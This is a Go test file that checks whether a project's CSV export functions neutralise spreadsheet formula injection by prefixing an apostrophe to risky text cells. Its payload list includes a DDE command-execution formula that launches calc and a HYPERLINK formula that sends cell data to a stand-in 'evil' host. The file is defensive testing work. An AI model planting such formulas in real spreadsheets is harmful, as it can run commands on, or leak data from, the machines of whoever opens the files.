package stats

import (
	"bytes"
	"encoding/csv"
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/Lynricsy/Oryn/internal/apigen"
	"github.com/Lynricsy/Oryn/internal/store/db"
)

// csvPayloads 是文本单元格的输入与期望（回读后的）单元格：危险前缀前置 '，其余原样（含逗号、引号、换行）。
var csvPayloads = []struct{ in, want string }{
	{"=1+1", "'=1+1"},
	{"+1", "'+1"},
	{"-2+3", "'-2+3"},
	{"@SUM(A1)", "'@SUM(A1)"},
	{"=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"},
	{"=HYPERLINK(\"https://evil/?d=\"&A1,\"x\")", "'=HYPERLINK(\"https://evil/?d=\"&A1,\"x\")"},
	{"\t=x", "'\t=x"},
	{"\tplain", "'\tplain"},
	{"\r=x", "'\r=x"},
	{"  =x", "'  =x"},
	{"\n@x", "'\n@x"},
	{"\x00=x", "'\x00=x"},
	{"\u00a0-1", "'\u00a0-1"},
	{"claude-opus-4", "claude-opus-4"},
	{"a,b \"q\"\nline2", "a,b \"q\"\nline2"},
	{"2026-11-15", "2026-11-15"},
	{"", ""},
}

// readCSV 解析 out，断言每行列数等于表头列数，返回数据行。
func readCSV(t *testing.T, out string, header []string) [][]string {
	t.Helper()
	r := csv.NewReader(strings.NewReader(out))
	r.FieldsPerRecord = -1
	recs, err := r.ReadAll()
	require.NoError(t, err)
	require.NotEmpty(t, recs)
	assert.Equal(t, header, recs[0])
	for i, rec := range recs {
		require.Len(t, rec, len(header), "第 %d 行列数不变", i)
	}
	return recs[1:]
}

func TestCSVText(t *testing.T) {
	for _, p := range csvPayloads {
		assert.Equal(t, p.want, csvText(p.in), "%q", p.in)
	}
}

func TestCSVFormulaInjection(t *testing.T) {
	for i, p := range csvPayloads {
		t.Run(fmt.Sprintf("%d_%q", i, p.in), func(t *testing.T) {
			s := new(p.in)
			var buf bytes.Buffer

			// 用量：无 series（key / label）与有 series（bucket）
			g := apigen.UsageStat{Key: p.in, Label: s, Requests: -1, InputTokens: -5, CostUsd: -0.5}
			require.NoError(t, WriteUsageCSV(&buf, apigen.UsageStats{Groups: []apigen.UsageStat{g}}))
			rows := readCSV(t, buf.String(), usageCSVHeader)
			require.Len(t, rows, 1)
			assert.Equal(t, []string{"", p.want, p.want, "-1", "0", "-5"}, rows[0][:6], "文本列中和、数值列（含负数）原样")
			assert.Equal(t, "-0.5", rows[0][9])

			buf.Reset()
			require.NoError(t, WriteUsageCSV(&buf, apigen.UsageStats{Series: []apigen.UsageSeriesPoint{{Key: p.in, Groups: []apigen.UsageStat{g}}}}))
			rows = readCSV(t, buf.String(), usageCSVHeader)
			require.Len(t, rows, 1)
			assert.Equal(t, []string{p.want, p.want, p.want, "-1"}, rows[0][:4])

			// 工具：工具名与桶
			buf.Reset()
			require.NoError(t, WriteToolsCSV(&buf, apigen.ToolStats{
				Tools:  []apigen.ToolStat{{Tool: p.in, Calls: -2, Errors: 1}},
				Series: []apigen.ToolSeriesPoint{{Key: p.in, Calls: 3, Errors: -4}},
			}))
			rows = readCSV(t, buf.String(), toolsCSVHeader)
			assert.Equal(t, [][]string{{"", p.want, "-2", "1"}, {p.want, "", "3", "-4"}}, rows)

			// orb：key / label / type
			buf.Reset()
			require.NoError(t, WriteOrbsCSV(&buf, apigen.OrbStats{Groups: []apigen.OrbStat{{Key: p.in, Label: s, Type: s, Cpus: new(-1), Orbs: 2, RunningMs: -3}}}))
			rows = readCSV(t, buf.String(), orbsCSVHeader)
			require.Len(t, rows, 1)
			assert.Equal(t, []string{p.want, p.want, p.want, "-1", "", "2", "-3"}, rows[0][:7])

			// 产出：key / label
			buf.Reset()
			require.NoError(t, WriteOutputCSV(&buf, apigen.OutputStats{Groups: []apigen.OutputStat{{Key: p.in, Label: s, ThreadsCreated: -1, ShippedCostUsd: -2.5}}}))
			rows = readCSV(t, buf.String(), outputCSVHeader)
			require.Len(t, rows, 1)
			assert.Equal(t, []string{p.want, p.want, "-1", "0", "0", "-2.5"}, rows[0][:6])
		})
	}
}

func TestUsageRecordsFormulaInjection(t *testing.T) {
	f := newFixture(t)
	f.thread("T", "prj_a", "", "work")
	for i, p := range csvPayloads {
		f.usage("T", int64(1000+i), p.in, 0.25, func(r *db.InsertUsageRecordParams) {
			r.Provider, r.Purpose, r.StopReason = p.in, p.in, p.in
		})
	}
	var buf bytes.Buffer
	require.NoError(t, WriteUsageRecords(f.ctx, f.st.Q, &buf, 0, 1<<40, Filter{}))
	rows := readCSV(t, buf.String(), recordsCSVHeader)
	require.Len(t, rows, len(csvPayloads))
	for i, p := range csvPayloads {
		r := rows[i]
		assert.Equal(t, fmt.Sprint(1000+i), r[0], "ts 原样")
		assert.Equal(t, []string{"T", "prj_a", ""}, r[2:5])
		assert.Equal(t, []string{p.want, p.want, p.want, "0", p.want}, r[5:10], "provider / model / purpose / subagent / stop_reason：%q", p.in)
		assert.Equal(t, []string{"10", "20", "0", "0", "0.25", "", ""}, r[10:], "数值列原样")
	}
}
